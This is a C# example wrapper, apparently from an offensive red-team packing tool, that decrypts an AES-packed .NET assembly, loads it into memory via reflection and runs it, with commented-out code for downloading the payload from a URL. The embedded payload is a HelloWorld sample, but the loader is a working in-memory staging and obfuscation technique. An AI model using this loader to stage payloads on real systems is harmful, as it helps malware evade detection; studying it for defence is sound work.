/* Description: An example wrapper that uses the EasyNet packing algorithm.
 *              Loads a packed Assembly and runs it using the Reflection API.
 *              
 *              Note:   This example is NOT OpSec-safe. It is not intended to be.
 *                      Rather, it demonstrates how EasyNet can be combined with other tools for obfuscation.
 * 
 * Author: The Wover
 * 
 * Referemces:
 * See the EasyNetLibrary project in this solution for EasyNet documentation.
 * Reflection Loading: https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load
 */

using EasyNetLibrary;
using System.Reflection;

namespace ExampleWrapper
{
    class Program
    {
        static void Main(string[] args)
        {
            //Hardcode our AES variables. Bad idea, but useful for non-interactive staging and demonstrates the principle.
            string key = "zFNCf6AvQI7NCQrx43x6mIVmYYdZ+O1n+8NL29+IhEo=";
            string iv = "AxnDDpUzglq9HkkqbjNEnA==";

            //Alternatively, get the AES variables as command-line arguments.
            //string key = args[0];
            //string iv = args[1];

            //Construct a struct to wrap the packed payload.
            EasyNetResult packed;

            //Save the AES variables.
            packed.key = key;
            packed.iv = iv;

            //Get the packed blob from the embedded resource
            packed.blob = Properties.Resources.HelloWorldPacked;

            //Payload could be embedded as a string
            //packed.blob = "OE/j...hl9L4";

            //Payload could be passed in at runtime as a command-line argument.
            //This is most flexible, but least reliable.
            //packed.blob = args[2];

            //Payload could also be retrieved from an URL (a la SharpCradle)
            /*MemoryStream stream = new MemoryStream();
            WebClient client = new WebClient();
            
            //Access web and read the bytes from the binary file
            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
            stream = new MemoryStream(client.DownloadData(url);
            BinaryReader reader = new BinaryReader(stream);
            byte[] bytes = reader.ReadBytes(Convert.ToInt32(stream.Length));
            stream.Close();
            reader.Close();
            packed.blob = System.Text.Encoding.ASCII.GetString(bytes)*/

            //Unpack the payload.
            byte[] payloadBytes = EasyNetPacker.Unpack(packed);

            //Load the assembly payload from memory using the Reflection API
            Assembly asm = Assembly.Load(payloadBytes);

            //Dynamically infer the entry point of the patload
            MethodInfo entry = asm.EntryPoint;

            //Specify any command-line arguments for the payload.
            string[] payloadArgs = { };

            //Set up the function signature of the Main entry point.
            object[] entryPointArgs = { payloadArgs };

            //Invoke the entry point (run the payload) from memory.
            entry.Invoke(null, entryPointArgs);
        }
    }
}
